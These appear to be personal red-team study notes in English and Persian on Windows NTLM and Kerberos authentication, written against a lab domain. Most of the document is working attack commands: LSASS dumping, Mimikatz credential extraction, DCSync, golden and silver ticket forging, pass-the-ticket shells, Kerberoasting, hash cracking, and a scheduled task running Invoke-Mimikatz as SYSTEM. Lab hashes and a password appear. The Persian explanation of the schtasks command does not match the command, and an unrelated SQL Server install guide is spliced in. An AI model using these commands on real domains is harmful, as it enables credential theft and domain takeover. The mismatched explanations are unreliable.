
authentication:
- SAM =local user
    - user : UID : LM hash : NT hash :::
    - C:\Windows\System32\config\SAM
![[Pasted image 20260113010851.png]]
	
- NTLM = network
    - 16 bytes encrypt by md4
    - 2 segment and 3 time encrypt by  DES
    - DES encrypt, hash NT
    - same password = same hash !
    - do not support multi authentication like OTP
    - pass 2000s
تبدیل میشه به به دوتیکه  LM و NT و این دوتا تیکه 3 بار رمزگذاری میشن به DES تا در نهایت 16 بایت بشن

یعنی در اصل اون challenge که به شکل hash برای ما ارسال شده با hash پسورد ما توسط الگوریتم DES 3 بار رمزگذاری میشن و ارسال میشه سمت سرور و سرور پسورد مارو از قبل داره و شروع میکنه challenge رو که برای ما ارسال کرده و hash پسورد رو 3 بار encrypt میکنه اگر حالا اون چیزی که خودش بدست اورده و چیزی که ما به طرفش ارسال کردیم یکی باشه یعنی پسوردمون رو ما به درستی وارد کردیم 

![[Pasted image 20260113013106.png]]
- Kerberos
     - encryption better than NTLM
     - support multi authentication like OTP
     - NTDS.dit
     - C:\Windows\ntds\ntds.dit
     - version5 2000s MIT university
     - Microsoft
     - can setup in unix - linux - apple - freeBSD
     - symmetric key encryption (all key and hash save in database KDC)
     - port 88
     - 1 - principal = authenticated user and service
     - principal name in kerberos (show which users or services authentication by Kerberos) :
     - 1 - UPN = user principle name => unique ----- > CHARON@local.test
     - 2 - SPN = service principles name => unique ------- > (show which service authenticated by
     - Kerberos ---- > LDAP - DFSR (Distributed File System Replication ----- > SYSVOL) - ACTIVE
     - DIRECTORY replication - ... )
![[Pasted image 20260113015311.png]]

KDC (Kerberos key distribution) (just on AD) (authenticator user and service)
- AS ---- > (after authentication create TGT (ticket granting ticket ) in credentials cache
- domain)
- TGS ---- > (after authentication create TGS (ticket granting service ) in credentials cache
- domain) )( for authentication KDC need TGT, never negotiate with service)
![[Pasted image 20260113020230.png]]

![[Pasted image 20260113020310.png]]

1- Red Key = SPNs
2- Blue Key =  user NTLM hash
3- Yellow Key = KRBTGT

1 - send hash (username + timestamp + SPN krbTGT (user KDC service) ) (encrypt packet by user
    NTLM hash) blue key
2 - authentication server response (TGT (HASH by krb TGT)) (user NTLM hash )
    username
   - user hash (blue key)
	   - session key
	   - expire time TGT
   - TGT (krbTGT HASH) (yellow key )
       - username
	   - session key
	   - expire time TGT
	   - PAC ( userprofile, SID, RID , ... )
	   - user privilege
3 - send TGS request
	- encryption by session key
	   - username
	   - timestamp
    TGT
    SPN Application server (SQL service)
4 - response (session key server + session key client) (red key)
    if session key cant receive to server, KDC uploud session key server on session key client .
	username
	encryption by session key
		services session key
	expire time TGS
	TGS (hash by service key )
		service sessions key
		username
		expire time TGS
		PAC ( userprofile, SID , RID , ... )
5 - send application service request
	send TGS copy
		TGS
		encryption by service sessions key
			username
			timestamp
6- Response
	check privilege and PAC by KDC
7- verify
8 - done can use


- **درخواست TGT:** کاربر، یک بسته رمزگذاری شده با NTLM hash خود و timestamp به KDC ارسال می‌کند.
- **پاسخ KDC:** KDC یک TGT رمزگذاری شده با NTLM hash کاربر، username، hash NTLM کاربر، session key، و زمان انقضا TGT را به کاربر ارسال می‌کند.
- **درخواست TGS:** کاربر، یک درخواست TGS با رمزگذاری session key (از TGT) و SPN سرویس درخواست شده (مانند SQL) به Application Server ارسال می‌کند.
- **پاسخ Application Server:** Application Server یک session key server، session key client، زمان انقضا TGS، و TGS (رمزگذاری شده با service key) را به کاربر ارسال می‌کند.
- **درخواست به سرویس:** کاربر، یک درخواست به سرویس با رمزگذاری TGS copy و service session key ارسال می‌کند.
- **تایید و صدور دسترسی:** KDC، دسترسی کاربر را با بررسی TGS و PAC (Profile, ACL, etc.) تایید می‌کند.
- **تایید نهایی:** کاربر، اعتبار خود را با سرویس تایید می‌کند.


---



![[Pasted image 20260115233607.png]]


یکی از نا امن ترین SSP سرویس Wdigest هستش که همونطور که در تصویر بالا مشاهده میکنید پسورد رو به صورت plain text نشون میده


---


dump Lsass

```shell
sysinternal --- > grocdump64.exe -accepteula -ma lsass.exe lsass. dmp 
```

powershell ---- >

load powershell
```shell
Get-Process Lsass
cd C:\Windows\System32
rundll32.exe comsvcs.dll, MiniDump 628 C:\lsass. DMP full
```

Meterpreter

![[Pasted image 20260115122730.png]]

from SAM

```shell
post/windows/gather/smart_hashdump
hashdunp
```

kiwi module

```shell
Load kiwi
creds_all
kiwi_cmd "privilege :: debug" "token :: elevate"
"sekurlsa :: logonpasswords" "lsadump :: lsa /inject" "lsadump: :sam"
```

Mimikatz module

```shell
Load mimikatz
mimikatz_command -f "sekurlsa :: logonpasswords"
mimikatz_command -f "lsadump :: lsa /inject"
mimikatz_command -f "Lsadump :: sam"
```


get user and password by tickets (hash) :

```
pypykatz lsa -k krb  minidump lsass.dmp
```

get shell by TGT ticket : 



```
locate kirbi2ccache
/usr/bin/minikerberos-kirbi2ccache

minikerberos-kirbi2ccache /root/krb/TGT_LOCAL.TEST_Administrator_krbtgt_LOCAL.TEST_73288ee6.kirbi administrator.ccache

locate psexec.py
/usr/share/doc/python3-impacket/examples/psexec.py

export KRB5CCNAME=administrator.ccache; /usr/share/doc/python3-impacket/examples/psexec.py -dc-ip 192.168.141.128 -target-ip 192.168.141.128 -no-pass -k local.test/administrator@WIN-V0OMIU9HP35.local.test
```

![[Pasted image 20260115122634.png]]



## get shell by TGT ticket : 

```
locate getTGT
/usr/share/doc/python3-impacket/examples/getTGT.py

getTGT.py -dc-ip 192.168.141.138 -hashes :8d41585ff58f59705f5d3337555024b2 RED.TEAM/administrator

export KRB5CCNAME=administrator.ccache;
./psexec.py -dc-ip 192.168.141.128 -target-ip 192.168.141.128 -no-pass -k local.test/administrator@WIN-V0OMIU9HP35.local.test
```

![[Pasted image 20260115123735.png]]

## get password :


```
kirbi2john TGT_LOCAL.TEST_Administrator_krbtgt_LOCAL.TEST_73288ee6.kirbi >> passkerb.txt
john --wordlist=/home/kali/.cache/vmware/drag_and_drop/Tk0fDi/rockyou2024.txt passkerb.txt
```

### GOLDEN ticket : 

we need :
	1 - Domain Name
	2 - SID number domian
	3 - administrator user
	4 - NTLM hash user KRBTGT

get all by mimikatz :
	ipconfig /all
        ```
		get sid: 
		use psgetsid.exe(sysinternal) , 
		Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
		powershell.exe  Get-WmiObject win32_useraccount | Select domain,name,sid
		Get-ADUser -Identity 'administrator' | select SID
		(new-object security.principal.ntaccount “administrator").translate([security.principal.securityidentifier])
        ```
        S-1-5-21-549688327-91903405-2500298261-1000
        user group : S-1-5-21
        domain : 549688327-91903405-2500298261
        user id : 1000

### Common Default and Well-Known SIDs

| SID                       | Name                          | Description                                                             |
| ------------------------- | ----------------------------- | ----------------------------------------------------------------------- |
| **S-1-0-0**               | Null SID                      | Represents no valid security principal.                                 |
| **S-1-1-0**               | Everyone                      | Represents all users and groups, including guests and anonymous users.  |
| **S-1-2-0**               | Local                         | Represents users who log on locally.                                    |
| **S-1-3-0**               | Creator Owner                 | The creator/owner of a resource.                                        |
| **S-1-3-1**               | Creator Group                 | The creator's primary group.                                            |
| **S-1-5-2**               | Network                       | Represents users who log on over a network.                             |
| **S-1-5-6**               | Service                       | Used by services that log on using a service account.                   |
| **S-1-5-7**               | Anonymous                     | Represents anonymous users.                                             |
| **S-1-5-9**               | Enterprise Domain Controllers | Represents all domain controllers in an enterprise.                     |
| **S-1-5-10**              | Principal Self                | The account that owns the resource.                                     |
| **S-1-5-11**              | Authenticated Users           | Represents all authenticated users.                                     |
| **S-1-5-18**              | Local System                  | The Local System account on the machine.                                |
| **S-1-5-19**              | NT Authority\LocalService     | Local Service account.                                                  |
| **S-1-5-20**              | NT Authority\NetworkService   | Network Service account.                                                |
| **S-1-5-32-544**          | Administrators                | Built-in Administrators group.                                          |
| **S-1-5-32-545**          | Users                         | Built-in Users group.                                                   |
| **S-1-5-32-546**          | Guests                        | Built-in Guests group.                                                  |
| **S-1-5-32-547**          | Power Users                   | Built-in Power Users group.                                             |
| **S-1-5-32-548**          | Account Operators             | Can manage user accounts in the domain.                                 |
| **S-1-5-32-549**          | Server Operators              | Can administer servers in the domain.                                   |
| **S-1-5-32-550**          | Print Operators               | Can manage printers in the domain.                                      |
| **S-1-5-32-551**          | Backup Operators              | Can bypass file and directory permissions to back up and restore files. |
| **S-1-5-32-552**          | Replicators                   | Manages domain replication.                                             |
| **S-1-5-21-<domain>-500** | Administrator                 | Default domain administrator account.                                   |
| **S-1-5-21-<domain>-501** | Guest                         | Default domain guest account.                                           |
| **S-1-5-21-<domain>-512** | Domain Admins                 | Default group for domain administrators.                                |
| **S-1-5-21-<domain>-513** | Domain Users                  | Default group for domain users.                                         |
| **S-1-5-21-<domain>-514** | Domain Guests                 | Default group for domain guests.                                        |
| **S-1-5-21-<domain>-515** | Domain Computers              | Default group for domain computers.                                     |
| **S-1-5-21-<domain>-516** | Domain Controllers            | Default group for domain controllers.                                   |
| **S-1-5-21-<domain>-517** | Cert Publishers               | Can manage certificates in Active Directory.                            |
| **S-1-5-21-<domain>-518** | Schema Admins                 | Has rights to modify the Active Directory schema.                       |
| **S-1-5-21-<domain>-519** | Enterprise Admins             | Has administrative rights across the entire forest.                     |
| **S-1-5-21-<domain>-520** | Group Policy Creator Owners   | Can manage Group Policy in the domain.                                  |
| **S-1-5-21-<domain>-553** | RAS and IAS Servers           | Used by RAS and IAS services for VPN access control.                    |

### Special Purpose SIDs

| SID              | Name                                       | Description                                                    |
| ---------------- | ------------------------------------------ | -------------------------------------------------------------- |
| **S-1-5-32-554** | BUILTIN\Pre-Windows 2000 Compatible Access | Group for backward compatibility with pre-Windows 2000 access. |
| **S-1-5-32-555** | BUILTIN\Remote Desktop Users               | Allows users to log on remotely.                               |
| **S-1-5-32-556** | BUILTIN\Network Configuration Operators    | Can configure network settings.                                |
| **S-1-5-32-557** | BUILTIN\Incoming Forest Trust Builders     | Used for establishing forest trusts.                           |
| **S-1-5-32-558** | BUILTIN\Performance Monitor Users          | Can monitor performance counters.                              |
| **S-1-5-32-559** | BUILTIN\Performance Log Users              | Can access and manage performance logs.                        |
| **S-1-5-32-560** | BUILTIN\Windows Authorization Access Group | Allows access to authorization data.                           |
| **S-1-5-32-561** | BUILTIN\Terminal Server License Servers    | Used by terminal servers for licensing.                        |
### 1. **Administrator (S-1-5-21-domain-500)**

- **Description**: This is the default administrator account for a domain or local system.
- **UID**: 500
- **Usage**: This account has unrestricted access to manage the system or domain.

### 2. **Guest (S-1-5-21-domain-501)**

- **Description**: The default guest account, which has limited access.
- **UID**: 501
- **Usage**: Often disabled by default, this account is used to allow temporary access with restricted permissions.

### 3. **krbtgt (S-1-5-21-domain-502)**

- **Description**: A default account used by the Kerberos Key Distribution Center (KDC) service.
- **UID**: 502
- **Usage**: Handles authentication services within Active Directory domains.

### 4. **Local Service (S-1-5-19)**

- **Description**: A built-in account used by Windows services with limited privileges on the local machine.
- **Usage**: Primarily used to run services in a limited, isolated environment.

### 5. **Network Service (S-1-5-20)**

- **Description**: A built-in account with slightly elevated privileges compared to Local Service.
- **Usage**: Used for network-facing services that need some permissions on the local machine and network.

### 6. **SYSTEM (S-1-5-18)**

- **Description**: The Local System account, a highly privileged account used by Windows to manage core system services.
- **Usage**: It has full access to the system and is used by the operating system to run essential services.

### 7. **Domain Admins (S-1-5-21-domain-512)**

- **Description**: The default group for domain administrators.
- **Usage**: Members have administrative access to the domain.

### 8. **Domain Users (S-1-5-21-domain-513)**

- **Description**: The default group for all users in a domain.
- **Usage**: General permissions are assigned to all domain users.

### 9. **Domain Guests (S-1-5-21-domain-514)**

- **Description**: The default group for guest accounts in a domain.
- **Usage**: Members have limited access similar to local guest users.

### 10. **Enterprise Admins (S-1-5-21-root domain-519)**

- **Description**: A group with administrative rights across the entire forest (multi-domain setup).
- **Usage**: Members can manage all domains in the Active Directory forest.


```
	privilege::debug
	lsadump::dcsync /user:DOMAIN\krbtgt
    kerberos::purge  
```
create spurious TGT ticket :
```
kerberos::golden /user:ali /domain:test.local /sid:S-1-5-21-977645439-875809767-3029232650 /krbtgt:f4b64a586392e8b067193d10fdb62e45 /id:500 /ptt
misc::cmd
psexec64.exe \\ip cmd.exe

kerberos::golden /user:ali /domain:test.local /sid:S-1-5-21-977645439-875809767-3029232650 /krbtgt:f4b64a586392e8b067193d10fdb62e45 /ticket:golden
kerberos::ptt golden
misc::cmd
psexec64.exe \\FULL ComputerName cmd.exe
```

get SID by impacket  : 

```
impacket-lookupsid test/administrator:Lkjh@963852oo@192.168.141.140

```

get krbhash by impacket :

```
impacket-secretsdump administrator:Lkjh@963852oo@192.168.141.140 -outputfile krb -user-status
```

create TICKET :

```
export PYTHONWARNINGS="ignore::DeprecationWarning
impacket-ticketer -nthash f4b64a586392e8b067193d10fdb62e45 -domain-sid "S-1-5-21-977645439-875809767-3029232650" -domain test.local -dc-ip 192.168.141.140 -user-id 500  ali
export KRB5CCNAME=ali.ccache
impacket-ticketConverter ali.ccache ticket.kirbi
kerberos::ptt golden.kirbi
misc::cmd
psexec64.exe \\FULLComputerName cmd.exe
```

connect active directory by REBEUS : 

```
rubeus.exe ptt /ticket:ticket.kirbi
psexec64.exe \\ip cmd.exe
```


# kiwi 

```
load kiwi
dcsync_ntlm krbtgt
shell
ipconfig all
meterpreter> golden_ticket_create -d red.team -u hamid -s S-1-5-21-2939322123-4012553637-8370183 -k 8f7f8279a64f6f968f10124b1b56c524 -t ticket.kirbi
kerberos_ticket_use ticket.kirbi
shell
dir \\fullComputerName\c$
```

----


# Kerberoasting :

**Kerberoasting**
نوعی حمله است که توسط مهاجم برای سرقت هش رمز عبور حساب‌های سرویس (Service Accounts) در یک محیط **Active Directory** استفاده می‌شود. این حمله از ضعف‌های پروتکل **Kerberos**، که یک پروتکل احراز هویت شبکه است، سوءاستفاده می‌کند تا به مهاجم اجازه دهد هش رمز عبور حساب‌های سرویس را استخراج کند و سپس آن‌ها را به حالت رمزعبور قابل فهم تبدیل کند (کرک کند).

### **پروتکل Kerberos و حساب‌های سرویس (Service Accounts)**
**Kerberos**
پروتکلی است که توسط **Active Directory** برای احراز هویت کاربران و سرویس‌ها در شبکه‌های ویندوزی استفاده می‌شود. این پروتکل برای این کار از **بلیت‌های احراز هویت (Tickets)** استفاده می‌کند که به کاربر اجازه می‌دهند تا به سرویس‌های خاصی در شبکه دسترسی پیدا کند. حساب‌های سرویس معمولاً برای اجرای سرویس‌های مختلف روی سرورها استفاده می‌شوند و این حساب‌ها می‌توانند دارای دسترسی‌های بالایی باشند، که باعث جذابیت آن‌ها برای مهاجمان می‌شود.

### **نحوه عملکرد حمله Kerberoasting**
مراحل اصلی حمله Kerberoasting به صورت زیر است:

#### **1. شناسایی حساب‌های سرویس دارای SPN (Service Principal Name)**
- حساب‌های سرویس در Active Directory دارای ویژگی **SPN** هستند که برای ارتباط با سرویس‌های شبکه استفاده می‌شود.
- مهاجم با استفاده از دستورهای **PowerShell**  می‌تواند حساب‌هایی که دارای SPN هستند را شناسایی کند. 

```
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} 

Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name, ServicePrincipalName
```
#### **2. درخواست TGS (Ticket Granting Service)**
- پس از شناسایی SPNها، مهاجم یک درخواست **TGS** به **KDC (Key Distribution Center)** ارسال می‌کند تا بلیتی (Ticket) برای دسترسی به سرویس مربوطه دریافت کند.
- این بلیت به صورت رمزگذاری‌شده با کلید رمز عبور حساب سرویس رمزگذاری می‌شود.

#### **3. استخراج TGS و ذخیره آن برای کرک کردن**
- مهاجم می‌تواند این بلیت‌های **TGS** رمزگذاری‌شده را که حاوی هش رمز عبور حساب سرویس هستند، استخراج کرده و برای کرک کردن آن‌ها ذخیره کند.
- ابزارهایی مانند **Mimikatz** یا **Rubeus** به مهاجم کمک می‌کنند که این بلیت‌ها را استخراج کند.

#### **4. کرک کردن بلیت‌های TGS (هش رمز عبور)**
- مهاجم هش‌های استخراج‌شده را به ابزارهایی مانند **Hashcat** یا **John the Ripper** می‌دهد تا آن‌ها را به حالت رمزعبور اصلی تبدیل کند.
- این ابزارها با استفاده از تکنیک‌های کرکینگ مانند **dictionary attack** یا **brute force** تلاش می‌کنند رمز عبور را پیدا کنند.

### **ابزارهای مورد استفاده در Kerberoasting**
1. **PowerShell**:
   - برای شناسایی حساب‌های دارای SPN و درخواست بلیت‌های TGS استفاده می‌شود.
   - مثال:
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties      ServicePrincipalName | Select-Object Name, ServicePrincipalName
```
2. **Mimikatz**:
   - ابزاری که به مهاجم اجازه می‌دهد بلیت‌های Kerberos (TGS) را از حافظه سیستم استخراج کند.
   - دستور برای استخراج TGS با Mimikatz:
```mimikatz
kerberos::list /export
```
3. **Rubeus**:
   - ابزار دیگری برای استخراج و مدیریت بلیت‌های Kerberos. این ابزار مشابه Mimikatz عمل می‌کند و قابلیت‌های گسترده‌ای برای Kerberoasting دارد.
4. **Hashcat** و **John the Ripper**:
   - این ابزارها برای کرک کردن هش‌های رمز عبور استفاده می‌شوند. **Hashcat** به ویژه برای کرک کردن هش‌های Kerberos با قدرت پردازش بالا مناسب است.

### **چرا Kerberoasting مؤثر است؟**
- **هش رمز عبور در اختیار مهاجم قرار می‌گیرد**: در این حمله، هش رمز عبور حساب‌های سرویس در اختیار مهاجم قرار می‌گیرد و مهاجم می‌تواند در محیط آفلاین بدون نگرانی از شناسایی توسط سیستم‌های تشخیص نفوذ (IDS) آن را کرک کند.
- **حساب‌های سرویس معمولاً دارای رمز عبورهای پیچیده نیستند**: بسیاری از حساب‌های سرویس در سازمان‌ها دارای رمزهای عبور ساده یا ثابت هستند، زیرا تغییر رمز آن‌ها می‌تواند باعث اختلال در سرویس‌های وابسته شود.
- **دسترسی‌های بالا**: بسیاری از حساب‌های سرویس دارای سطح دسترسی بالایی هستند و کرک کردن این رمز عبور به مهاجم اجازه می‌دهد به منابع و اطلاعات حیاتی دسترسی پیدا کند.

### **نکات دفاعی برای جلوگیری از Kerberoasting**
1. **استفاده از رمز عبورهای پیچیده و طولانی**:
   - رمز عبورهای حساب‌های سرویس باید پیچیده و طولانی باشند تا کرک کردن آن‌ها بسیار زمان‌بر و سخت شود.

2. **استفاده از Managed Service Accounts (MSAs)**:
   - به جای استفاده از حساب‌های سرویس معمولی، از **MSAs** استفاده کنید. این نوع حساب‌ها دارای ویژگی‌های مدیریت خودکار رمز عبور هستند که امنیت را افزایش می‌دهند.

3. **محدود کردن دسترسی حساب‌های سرویس**:
   - دسترسی حساب‌های سرویس را به حداقل مقدار لازم محدود کنید و از اعطای دسترسی‌های بیش از حد خودداری کنید.

4. **مانیتور کردن درخواست‌های TGS**:
   - درخواست‌های غیرمعمول برای بلیت‌های TGS را مانیتور کنید. درخواست‌های متعدد برای حساب‌های دارای SPN می‌تواند نشانه‌ای از حمله Kerberoasting باشد.

5. **استفاده از Group Managed Service Accounts (gMSA)**:
   - این نوع حساب‌ها به مدیریت خودکار رمز عبور کمک می‌کنند و امنیت بیشتری نسبت به حساب‌های سنتی دارند.

### **جمع‌بندی**
**Kerberoasting** : 
یک حمله بسیار مؤثر است که با استفاده از ضعف‌های پروتکل **Kerberos**، هش رمز عبور حساب‌های سرویس را استخراج کرده و آن‌ها را کرک می‌کند. این حمله به مهاجم اجازه می‌دهد بدون تعامل مستقیم با سیستم‌ها و در محیط آفلاین رمز عبور حساب‌ها را پیدا کند. برای دفاع در برابر این حمله، باید از رمز عبورهای پیچیده و طولانی، استفاده از **Managed Service Accounts**، محدود کردن دسترسی حساب‌ها و مانیتورینگ دقیق استفاده کرد.


### **نصب SQL Server 2019**

1. **اجرای فایل نصبی:**
    
    - فایل نصبی SQL Server 2019 (مثلاً `SQLServer2019-x64-ENU.exe`) را اجرا کنید.
    - گزینه **New SQL Server stand-alone installation or add features to an existing installation** را انتخاب کنید.
2. **بررسی قوانین و پیش‌نیازها (Setup Support Rules):**
    
    - برنامه نصب برخی از پیش‌نیازها را بررسی می‌کند. اگر مشکلی وجود داشت، آن را برطرف کنید.
3. **وارد کردن Product Key (در صورت نیاز):**
    
    - اگر نسخه‌ای غیر از Developer یا Express نصب می‌کنید، کلید محصول (Product Key) را وارد کنید.
4. **پذیرش قوانین و شرایط:**
    
    - گزینه **I accept the license terms** را انتخاب کنید و به مرحله بعد بروید.
5. **انتخاب نوع نصب:**
    
    - برای نصب کامل، گزینه **Feature Installation** را انتخاب کنید.
6. **انتخاب ویژگی‌ها (Features):**
    
    - ویژگی‌هایی که می‌خواهید نصب کنید را انتخاب کنید. برای یک نصب پایه، موارد زیر توصیه می‌شوند:
        - **Database Engine Services** (موتور اصلی پایگاه داده)
        - **SQL Server Replication** (در صورت نیاز به تکرار داده‌ها)
        - **Full-Text and Semantic Extractions for Search** (برای جستجوی پیشرفته)
        - **SQL Server Analysis Services (SSAS)** و **SQL Server Reporting Services (SSRS)** (در صورت نیاز به BI و گزارش‌گیری)
7. **تنظیمات Instance:**
    
    - گزینه **Default instance** را انتخاب کنید (نام پیش‌فرض: `MSSQLSERVER`) یا یک نام سفارشی برای Instance خود تعیین کنید.
8. **تنظیمات حساب‌های سرویس (Server Configuration):**
    
    - حساب‌های کاربری سرویس SQL Server را مشخص کنید. توصیه می‌شود از **حساب‌های دامین** استفاده کنید اگر سرور در یک دامین است.
    - برای هر سرویس، گزینه **Automatic Startup** را تنظیم کنید.
9. **پیکربندی موتور پایگاه داده (Database Engine Configuration):**
    
    - در این مرحله، نوع احراز هویت را انتخاب کنید:
        - **Mixed Mode**: هم از احراز هویت ویندوز و هم از احراز هویت SQL پشتیبانی می‌کند.
        - **Windows Authentication Mode**: فقط از احراز هویت ویندوز استفاده می‌کند.
    - اگر **Mixed Mode** را انتخاب می‌کنید، رمز عبور برای حساب **sa** تنظیم کنید.
    - حساب‌های ادمین SQL Server را مشخص کنید (مثلاً حساب فعلی شما).
10. **تنظیمات SSAS (Analysis Services):**
    
    - حالت SSAS (Multidimensional and Data Mining یا Tabular) را انتخاب کنید.
    - حساب‌های ادمین Analysis Services را تعیین کنید.
11. **بررسی و نصب:**
    
    - تنظیمات را بررسی کنید و روی **Install** کلیک کنید.

---

### **3. پس از نصب**

1. **SQL Server Management Studio (SSMS):**
    
    - برای مدیریت SQL Server، ابزار **SQL Server Management Studio** (SSMS) را نصب کنید. این ابزار رایگان است و می‌توانید آن را از [لینک مایکروسافت](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms) دانلود کنید.
2. **اتصال به SQL Server:**
    
    - SSMS را باز کنید و به سرور SQL متصل شوید:
        - سرور: `localhost` (برای سرور محلی) یا نام سرور.
        - احراز هویت: ویندوز یا SQL.
3. **پیکربندی اولیه:**
    
    - ایجاد دیتابیس جدید.
    - تنظیم پشتیبان‌گیری (Backup).
    - بررسی لاگ‌ها و خطاهای احتمالی.


# ATTACK : 

powershell script for find SPN : 

```
	Import-Module\Find-Potentially CrackableAccounts.psl
	Find-PotentiallyCrackableAccounts.ps1 -FullData -Verbose
    Import-Module\Export-PotentiallyCrackableAccounts.ps1
    Export-PotentiallyCrackableAccounts
```

![[Pasted image 20241125143240.png]]

get all SPN name : 

```
`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object Name, ServicePrincipalName`

----------
 setspn -T medin -Q */*

```

![[Pasted image 20241125143335.png]]
![[Pasted image 20241125143439.png]]
# get password hash : 

```
import-module ./get-tgscipher
Get-TGSCipher -SPN "MSSQLSvc/test2.red.team" -format john
```

![[Pasted image 20241125143526.png]]
# find PASSWORD : 

```
john --wordlist=/home/kali/Downloads/rockyou.txt pass.txt 
```

![[Pasted image 20241125143805.png]]
# use MIMIKATZ :

```
kerberos::list /export
```

![[Pasted image 20241125144057.png]]
![[Pasted image 20241125144522.png]]
# find PASSWORD :

```
john --wordlist=/home/kali/Downloads/rockyou.txt pass.txt
```

![[Pasted image 20260115142345.png]]

# Rubeus :

```
./Rubeus.exe kerberoast /nowrap
```

![[Pasted image 20260115142144.png]]


# use HASHCAT for get PASSWORD : 

```
hashcat -m 13100 --force -a 0 /home/kali/Downloads/pass.txt /home/kali/Downloads/rockyou.txt
```

![[Pasted image 20241125151813.png]]![[Pasted image 20241125151849.png]]

# get all in Invoke-Kerberoast :

```powershell
1- /usr/share/powershell-empire/empire/test/data/module_source/credentials/Invoke-Kerberoast.ps1
2 - Invoke-Kerberoast
```

![[Pasted image 20260115142235.png]]


# impacket

```
/usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip 192.168.141.140 red.team/ali
```

![[Pasted image 20241125223206.png]]

# dump LSASS :

```
sysinternal ---- > procdump64.exe -accepteula -ma lsass.exe lsass.dmp
pypykatz lsa -k krb  minidump lsass.dmp
kirbi2john TGT_LOCAL.TEST_Administrator_krbtgt_LOCAL.TEST_73288ee6.kirbi >> passkerb.txt
john --wordlist=/home/kali/.cache/vmware/drag_and_drop/Tk0fDi/rockyou2024.txt passkerb.txt
```
![[Pasted image 20241126094130.png]]

----
# SILVER ticket 
need : 
	DC computer account hash
	SID domain

![[Pasted image 20260115232032.png]]

شناسایی SPN از طریق  SID اگه اخرش 20 باشه یعنی سرویسه  و مشخصاتی که برای silver ticket استفاده میشه اسم hash سرویس هستش 

![[Pasted image 20260115232402.png]]



### CIFS :

```
kerberos::golden /admin:ahmad /domain:RED.TEAM /id:500 /sid:S-1-5-21-1807605247-2408605128-2947868414 /target:DC.RED.TEAM /rc4:d3b48a0ef60cbfb15408db43d32fa96f /service:cifs /ticket:silver
kerberos::ptt silver
dir \\DC\c$\

or 


kerberos::golden /admin:fateme /domain:RED.TEAM /id:500 /sid:S-1-5-21-1807605247-2408605128-2947868414 /target:DC.RED.TEAM /rc4:d3b48a0ef60cbfb15408db43d32fa96f /service:cifs /ticket:silver.kirbi
.\Rubeus.exe ptt /ticket:silver
kerberos::ptt silver
.\PsExec.exe -accepteula \\DC\c$ cmd
```


```
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache 
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```


### HOST : 

```
kerberos::golden /admin:fateme /domain:RED.TEAM /id:500 /sid:S-1-5-21-1807605247-2408605128-2947868414 /target:DC.RED.TEAM /rc4:d3b48a0ef60cbfb15408db43d32fa96f /service:HOST /ptt or /ticket:silver
dir \\DC\c$\

or 


kerberos::golden /admin:fateme /domain:RED.TEAM /id:500 /sid:S-1-5-21-1807605247-2408605128-2947868414 /target:DC.RED.TEAM /rc4:d3b48a0ef60cbfb15408db43d32fa96f /service:HOST /ticket:silver.kirbi
.\Rubeus.exe ptt /ticket:silver.kirbi
.\PsExec.exe -accepteula \\DC\c$ cmd
```

```
schtasks /create /S DC.RED.TEAM /SC DAILY /RU "NT AUTHORITY\SYSTEM" /TN "RUN malware" /TR "powershell.exe -ExecutionPolicy Bypass -File c:\windows\temp\Invoke-Mimikatz.ps1"
```
### توضیحات اجزای مختلف دستور:

1. **`/create`**: 
   این سوئیچ برای ایجاد یک Task جدید در **Windows Task Scheduler** است.
    
2. **`/S DC.RED.TEAM`**:
    این قسمت به **remote machine** اشاره می‌کند که به طور پیش‌فرض قرار است **Task** در آن ایجاد شود. در اینجا، `adsdc02.lab.adsecurity.org` نام یا آدرس **domain controller** یا سیستم دیگری است که Task در آن ایجاد خواهد شد.
    
3. **`/SC DAILY`**:
    این سوئیچ زمانبندی اجرای Task را مشخص می‌کند. `WEEKLY` به معنای اجرای Task به صورت هفتگی است.
    
4. **`/RU "NT Authority\System"`**:
    این سوئیچ تعیین می‌کند که Task تحت چه حساب کاربری اجرا شود. در اینجا، `NT Authority\System` (که معمولاً به عنوان **SYSTEM** شناخته می‌شود) به این معناست که Task با بالاترین سطح دسترسی (مجوزهای سیستمی) اجرا خواهد شد.
    
5. **`/IN "SCOM Agent Health Check"`**: 
   این قسمت نامی برای Task است که در **Task Scheduler** نمایش داده می‌شود. در اینجا، نام Task `SCOM Agent Health Check` است. این نام می‌تواند به عنوان یک وظیفه معمولی یا مشروع برای فریب سیستم استفاده شود.
    
6. **`/IR "c:\windows\temp\Invoke-Mimikatz.ps1"`**: 
   این بخش مشخص می‌کند که کدام اسکریپت باید اجرا شود. در اینجا، اسکریپت `Invoke-Mimikatz.ps1` از مسیر `c:\windows\temp\` اجرا خواهد شد. این اسکریپت، که معمولاً برای انجام حملات **Mimikatz** (برای استخراج پسوردها و Hash‌ها از حافظه) استفاده می‌شود، به طور خاص می‌تواند به طور مخفیانه بر روی سیستم هدف اجرا شود.
    


این دستور یک **Task** جدید در سیستم مقصد (`DC.RED.TEAM`) ایجاد می‌کند که به طور هفتگی با حساب **SYSTEM** اجرا می‌شود. این Task اسکریپت **PowerShell** با نام `Invoke-Mimikatz.ps1` را اجرا می‌کند که احتمالاً برای اهداف مخرب مانند استخراج اطلاعات حساس (پسوردها و هاش‌ها) از حافظه سیستم هدف طراحی شده است.

![[Pasted image 20241203175543.png]]

```
schtasks /query /S DC.RED.TEAM
```

![[Pasted image 20241203175348.png]]

### LDAP : 

```
kerberos::golden /admin:fateme /domain:RED.TEAM /id:500 /sid:S-1-5-21-1807605247-2408605128-2947868414 /target:DC.RED.TEAM /rc4:d3b48a0ef60cbfb15408db43d32fa96f /service:LDAP /ticket:silver.kirbi
dir \\DC\c$\

or 


